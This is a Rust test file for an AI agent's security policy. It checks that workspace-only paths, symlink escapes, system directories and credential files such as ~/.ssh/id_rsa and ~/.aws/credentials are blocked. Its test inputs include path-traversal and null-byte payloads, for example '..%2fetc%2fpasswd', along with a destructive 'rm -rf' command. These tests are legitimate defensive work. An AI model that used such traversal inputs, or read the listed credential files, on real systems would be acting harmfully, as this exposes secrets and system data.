fn workspace_only_true_blocks_resolved_outside_workspace() {
    let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_true");
    let _ = std::fs::create_dir_all(&workspace);
    let canonical_workspace = workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.clone());

    let p = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        workspace_only: true,
        ..SecurityPolicy::default()
    };

    // Path inside workspace — allowed
    let inside = canonical_workspace.join("subdir");
    assert!(
        p.is_resolved_path_allowed(&inside),
        "path inside workspace must be allowed"
    );

    // Path outside workspace — blocked
    let outside = std::env::temp_dir()
        .canonicalize()
        .unwrap_or_else(|_| std::env::temp_dir())
        .join("zeroclaw_outside_ws_true");
    assert!(
        !p.is_resolved_path_allowed(&outside),
        "workspace_only=true must block resolved paths outside workspace"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

// ── Edge cases: from_config preserves tracker ────────────

#[test]
fn from_config_creates_fresh_tracker() {
    let autonomy_config = crate::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec![],
        forbidden_paths: vec![],
        max_actions_per_hour: 10,
        max_cost_per_day_cents: 100,
        require_approval_for_medium_risk: true,
        block_high_risk_commands: true,
        ..crate::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
    assert!(!policy.is_rate_limited());
}

// ══════════════════════════════════════════════════════════
// SECURITY CHECKLIST TESTS
// Checklist: gateway not public, pairing required,
//            filesystem scoped (no /), access via tunnel
// ══════════════════════════════════════════════════════════

// ── Checklist #3: Filesystem scoped (no /) ──────────────

#[test]
fn checklist_root_path_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/"));
    assert!(!p.is_path_allowed("/anything"));
}

#[test]
fn checklist_all_system_dirs_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for dir in [
        "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
        "/proc", "/sys", "/var", "/tmp",
    ] {
        assert!(
            !p.is_path_allowed(dir),
            "System dir should be blocked: {dir}"
        );
        assert!(
            !p.is_path_allowed(&format!("{dir}/subpath")),
            "Subpath of system dir should be blocked: {dir}/subpath"
        );
    }
}

#[test]
fn checklist_sensitive_dotfiles_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for path in [
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
        "~/.aws/credentials",
        "~/.config/secrets",
    ] {
        assert!(
            !p.is_path_allowed(path),
            "Sensitive dotfile should be blocked: {path}"
        );
    }
}

#[test]
fn checklist_null_byte_injection_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
    assert!(!p.is_path_allowed("\0"));
    assert!(!p.is_path_allowed("file\0"));
}

#[test]
fn checklist_workspace_only_blocks_absolute_outside_workspace() {
    let p = SecurityPolicy {
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/any/absolute/path"));
    assert!(p.is_path_allowed("relative/path.txt"));
}

#[test]
fn checklist_resolved_path_must_be_in_workspace() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/project"),
        ..SecurityPolicy::default()
    };
    // Inside workspace — allowed
    assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
    // Outside workspace — blocked (symlink escape)
    assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
    assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
    // Root — blocked
    assert!(!p.is_resolved_path_allowed(Path::new("/")));
}

#[test]
fn checklist_default_policy_is_workspace_only() {
    let p = SecurityPolicy::default();
    assert!(
        p.workspace_only,
        "Default policy must be workspace_only=true"
    );
}

#[test]
fn checklist_default_forbidden_paths_comprehensive() {
    let p = SecurityPolicy::default();
    // Must contain all critical system dirs
    for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dir),
            "Default forbidden_paths must include {dir}"
        );
    }
    // Must contain sensitive dotfiles
    for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dot),
            "Default forbidden_paths must include {dot}"
        );
    }
}

// ── §1.2 Path resolution / symlink bypass tests ──────────

#[test]
fn resolved_path_blocks_outside_workspace() {
    let workspace = std::env::temp_dir().join("zeroclaw_test_resolved_path");
    let _ = std::fs::create_dir_all(&workspace);

    // Use the canonicalized workspace so starts_with checks match
    let canonical_workspace = workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.clone());

    let policy = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        ..SecurityPolicy::default()
    };

    // A resolved path inside the workspace should be allowed
    let inside = canonical_workspace.join("subdir").join("file.txt");
    assert!(
        policy.is_resolved_path_allowed(&inside),
        "path inside workspace should be allowed"
    );

    // A resolved path outside the workspace should be blocked
    let canonical_temp = std::env::temp_dir()
        .canonicalize()
        .unwrap_or_else(|_| std::env::temp_dir());
    let outside = canonical_temp.join("outside_workspace_zeroclaw");
    assert!(
        !policy.is_resolved_path_allowed(&outside),
        "path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

#[test]
fn resolved_path_blocks_root_escape() {
    let policy = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/zeroclaw_user/project"),
        ..SecurityPolicy::default()
    };

    assert!(
        !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
        "resolved path to /etc/passwd must be blocked"
    );
    assert!(
        !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
        "resolved path to /root/.bashrc must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn resolved_path_blocks_symlink_escape() {
    use std::os::unix::fs::symlink;

    let root = std::env::temp_dir().join("zeroclaw_test_symlink_escape");
    let workspace = root.join("workspace");
    let outside = root.join("outside_target");

    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&outside).unwrap();

    // Create a symlink inside workspace pointing outside
    let link_path = workspace.join("escape_link");
    symlink(&outside, &link_path).unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        ..SecurityPolicy::default()
    };

    // The resolved symlink target should be outside workspace
    let resolved = link_path.canonicalize().unwrap();
    assert!(
        !policy.is_resolved_path_allowed(&resolved),
        "symlink-resolved path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[cfg(unix)]
#[test]
fn allowed_roots_permits_paths_outside_workspace() {
    use std::os::unix::fs::symlink;

    let root = std::env::temp_dir().join("zeroclaw_test_allowed_roots");
    let workspace = root.join("workspace");
    let extra = root.join("extra_root");
    let extra_file = extra.join("data.txt");

    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&extra).unwrap();
    std::fs::write(&extra_file, "test").unwrap();

    // Symlink inside workspace pointing to extra root
    let link_path = workspace.join("link_to_extra");
    symlink(&extra, &link_path).unwrap();

    let resolved = link_path.join("data.txt").canonicalize().unwrap();

    // Without allowed_roots — blocked (symlink escape)
    let policy_without = SecurityPolicy {
        workspace_dir: workspace.clone(),
        allowed_roots: vec![],
        ..SecurityPolicy::default()
    };
    assert!(
        !policy_without.is_resolved_path_allowed(&resolved),
        "without allowed_roots, symlink target must be blocked"
    );

    // With allowed_roots — permitted
    let policy_with = SecurityPolicy {
        workspace_dir: workspace.clone(),
        allowed_roots: vec![extra.clone()],
        ..SecurityPolicy::default()
    };
    assert!(
        policy_with.is_resolved_path_allowed(&resolved),
        "with allowed_roots containing the target, symlink must be allowed"
    );

    // Unrelated path still blocked
    let unrelated = root.join("unrelated");
    std::fs::create_dir_all(&unrelated).unwrap();
    assert!(
        !policy_with.is_resolved_path_allowed(&unrelated.canonicalize().unwrap()),
        "paths outside workspace and allowed_roots must still be blocked"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn is_path_allowed_blocks_null_bytes() {
    let policy = default_policy();
    assert!(
        !policy.is_path_allowed("file\0.txt"),
        "paths with null bytes must be blocked"
    );
}

#[test]
fn is_path_allowed_blocks_url_encoded_traversal() {
    let policy = default_policy();
    assert!(
        !policy.is_path_allowed("..%2fetc%2fpasswd"),
        "URL-encoded path traversal must be blocked"
    );
    assert!(
        !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
        "URL-encoded parent dir traversal must be blocked"
    );
}

#[test]
fn resolve_tool_path_expands_tilde() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/workspace"),
        ..SecurityPolicy::default()
    };
    let resolved = p.resolve_tool_path("~/Documents/file.txt");
    // Should expand ~ to home dir, not join with workspace
    assert!(resolved.is_absolute());
    assert!(!resolved.starts_with("/workspace"));
    assert!(resolved.to_string_lossy().ends_with("Documents/file.txt"));
}

#[test]
fn resolve_tool_path_keeps_absolute() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/workspace"),
        ..SecurityPolicy::default()
    };
    let resolved = p.resolve_tool_path("/some/absolute/path");
    assert_eq!(resolved, PathBuf::from("/some/absolute/path"));
}

#[test]
fn resolve_tool_path_joins_relative() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/workspace"),
        ..SecurityPolicy::default()
    };
    let resolved = p.resolve_tool_path("relative/path.txt");
    assert_eq!(resolved, PathBuf::from("/workspace/relative/path.txt"));
}

#[test]
fn resolve_tool_path_normalizes_workspace_prefixed_relative_paths() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/zeroclaw-data/workspace"),
        ..SecurityPolicy::default()
    };
    let resolved = p.resolve_tool_path("zeroclaw-data/workspace/scripts/daily.py");
    assert_eq!(
        resolved,
        PathBuf::from("/zeroclaw-data/workspace/scripts/daily.py")
    );
}

#[test]
fn is_under_allowed_root_matches_allowed_roots() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/workspace"),
        workspace_only: true,
        allowed_roots: vec![PathBuf::from("/projects"), PathBuf::from("/data")],
        ..SecurityPolicy::default()
    };
    assert!(p.is_under_allowed_root("/projects/myapp/src/main.rs"));
    assert!(p.is_under_allowed_root("/data/file.csv"));
    assert!(!p.is_under_allowed_root("/etc/passwd"));
    assert!(!p.is_under_allowed_root("relative/path"));
}

#[test]
fn is_under_allowed_root_returns_false_for_empty_roots() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/workspace"),
        workspace_only: true,
        allowed_roots: vec![],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_under_allowed_root("/any/path"));
}

#[test]
fn runtime_config_paths_are_protected() {
    let workspace = PathBuf::from("/tmp/zeroclaw-profile/workspace");
    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        ..SecurityPolicy::default()
    };
    let config_dir = workspace.parent().unwrap();

    assert!(policy.is_runtime_config_path(&config_dir.join("config.toml")));
    assert!(policy.is_runtime_config_path(&config_dir.join("config.toml.bak")));
    assert!(policy.is_runtime_config_path(&config_dir.join(".config.toml.tmp-1234")));
    assert!(policy.is_runtime_config_path(&config_dir.join("active_workspace.toml")));
    assert!(policy.is_runtime_config_path(&config_dir.join(".active_workspace.toml.tmp-1234")));
}

#[test]
fn workspace_files_are_not_runtime_config_paths() {
    let workspace = PathBuf::from("/tmp/zeroclaw-profile/workspace");
    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        ..SecurityPolicy::default()
    };
    let nested_dir = workspace.join("notes");

    assert!(!policy.is_runtime_config_path(&workspace.join("notes.txt")));
    assert!(!policy.is_runtime_config_path(&nested_dir.join("config.toml")));
}

// ── prompt_summary ──────────────────────────────────────

#[test]
fn prompt_summary_includes_autonomy_level() {
    let p = default_policy();
    let summary = p.prompt_summary();
    assert!(
        summary.contains("Supervised"),
        "should mention autonomy level"
    );
}

#[test]
fn prompt_summary_includes_workspace_boundary_when_workspace_only() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/project"),
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(
        summary.contains("Workspace boundary"),
        "should mention workspace boundary"
    );
    assert!(
        summary.contains("/home/user/project"),
        "should mention workspace path"
    );
}

#[test]
fn prompt_summary_omits_workspace_boundary_when_not_workspace_only() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(
        !summary.contains("Workspace boundary"),
        "should not mention workspace boundary"
    );
}

#[test]
fn prompt_summary_includes_allowed_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["git".into(), "ls".into()],
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(summary.contains("`git`"), "should list allowed commands");
    assert!(summary.contains("`ls`"), "should list allowed commands");
    assert!(
        summary.contains("You may execute these commands freely"),
        "should mention allowed commands positively"
    );
}

#[test]
fn prompt_summary_includes_forbidden_paths() {
    let p = SecurityPolicy {
        workspace_only: false,
        forbidden_paths: vec!["/etc".into(), "~/.ssh".into()],
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(summary.contains("`/etc`"), "should list forbidden paths");
    assert!(summary.contains("`~/.ssh`"), "should list forbidden paths");
}

#[test]
fn prompt_summary_includes_rate_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 42,
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(summary.contains("42"), "should mention rate limit");
    assert!(
        summary.contains("actions per hour"),
        "should explain rate limit"
    );
}

#[test]
fn prompt_summary_includes_risk_controls() {
    let p = SecurityPolicy {
        block_high_risk_commands: true,
        require_approval_for_medium_risk: true,
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(
        summary.contains("Exercise caution with destructive commands"),
        "should mention high-risk caution"
    );
    assert!(
        summary.contains("Medium-risk commands"),
        "should mention medium-risk approval"
    );
}

#[test]
fn prompt_summary_includes_allowed_roots() {
    let p = SecurityPolicy {
        allowed_roots: vec![PathBuf::from("/shared/data"), PathBuf::from("/opt/tools")],
        ..SecurityPolicy::default()
    };
    let summary = p.prompt_summary();
    assert!(
        summary.contains("`/shared/data`"),
        "should list allowed roots"
    );
    assert!(
        summary.contains("`/opt/tools`"),
        "should list allowed roots"
    );
}

#[test]
fn wildcard_with_block_high_risk_false_allows_everything() {
    let p = SecurityPolicy {
        allowed_commands: vec!["*".into()],
        block_high_risk_commands: false,
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(
        p.validate_command_execution("rm -rf /tmp/test", true)
            .is_ok()
    );
    assert!(p.validate_command_execution("nohup firefox", true).is_ok());
    assert!(
        p.validate_command_execution("ls /usr/bin/firefox", true)
            .is_ok()
    );
}

#[test]
fn wildcard_with_block_high_risk_true_still_blocks() {
    // Ensure the existing safety net is preserved: wildcard + block_high_risk_commands=true
    // should still block high-risk commands.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["*".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };
    let result = p.validate_command_execution("rm -rf /tmp/test", true);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("high-risk"));
}

#[test]
fn per_sender_tracker_isolates_counts() {
    let t = PerSenderTracker::new();
    // sender A hits limit=2 on 3rd call
    assert!(t.record_within("chat_a", 2)); // count=1 ≤ 2 → ok
    assert!(t.record_within("chat_a", 2)); // count=2 ≤ 2 → ok
    assert!(!t.record_within("chat_a", 2)); // count=3 > 2 → blocked
    // sender B is unaffected — its bucket is empty
    assert!(t.record_within("chat_b", 2)); // count=1 ≤ 2 → ok
    assert!(t.record_within("chat_b", 2)); // count=2 ≤ 2 → ok
    assert!(!t.record_within("chat_b", 2)); // count=3 > 2 → blocked
}

#[test]
fn per_sender_tracker_global_key_fallback() {
    let t = PerSenderTracker::new();
    assert!(!t.is_exhausted(PerSenderTracker::GLOBAL_KEY, 1));
    t.record_within(PerSenderTracker::GLOBAL_KEY, u32::MAX);
    // after 1 action, count=1 ≥ 1 → exhausted at max=1
    assert!(t.is_exhausted(PerSenderTracker::GLOBAL_KEY, 1));
}

#[test]
fn per_sender_tracker_is_exhausted_reads_without_spurious_insert() {
    let t = PerSenderTracker::new();
    // Key "ghost" has never been recorded — should not be exhausted at max=1
    assert!(!t.is_exhausted("ghost", 1));
}
